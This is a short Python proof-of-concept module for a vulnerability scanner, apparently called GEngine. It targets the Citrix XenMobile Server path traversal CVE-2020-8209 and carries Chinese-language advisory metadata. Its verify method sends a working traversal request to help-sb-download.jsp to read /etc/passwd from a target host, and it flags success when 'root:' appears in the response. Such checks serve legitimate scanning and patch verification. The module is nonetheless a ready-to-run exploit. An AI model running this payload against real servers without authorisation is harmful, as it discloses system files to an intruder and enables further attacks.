# coding : utf-8
# @Time : 2022/10/11 20:12
# @Author : hqe
# @File : GEngine_console.py
# @Project : GEngine


from BasePoc import BasePoc
from lib.ReqUtils import req
from lib.Payload import headers

POC_NAME="CSXS"

class CSXS(BasePoc):

    poc_info = {
            'Id': 'v_2022_0002',
            'Name': 'Citrix Systems XenMobile Server 路径遍历漏洞',
            'Author': 'hqe',
            'Create_date': '2022-10-11',
    }

    vul_info = {
        'Product': 'XenMobile',
        'Version': 'Citrix Systems XenMobile Server 10.12 RP2之前版本，10.11 RP4之前版本，10.10 RP6之前版本，10.9 RP5之前版本。',
        'Type': '路径遍历',
        'Level': 2,
        'CVE': 'CVE-2020-8209',
        'CNNVD': 'CVE-2020-8209',
        'CNVD': 'CNVD-2020-50156',
        'Description': """
                               Citrix Systems XenMobile Server是美国思杰系统（Citrix Systems）公司的一套移动管理解决方案。该方案能够管理移动设备、制定移动策略和合规性规则、深入了解移动移动网络运行情况等。
                               Citrix Systems XenMobile Server中存在路径遍历漏洞。攻击者可利用该漏洞读取正在运行应用程序的服务器上的任意文件。 
                               """,
        'DisclosureDate': '2020-01-28',
    }

    def verify(self):

        payload = '/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd'
        port = '80'
        url = "http://" + self.scan_info['Target'] + ":" + port + payload
        response = req(url,'get',headers=headers)
        if response.status_code == 200 and b"root:" in response.content:
            self.scan_info['Success'] = True

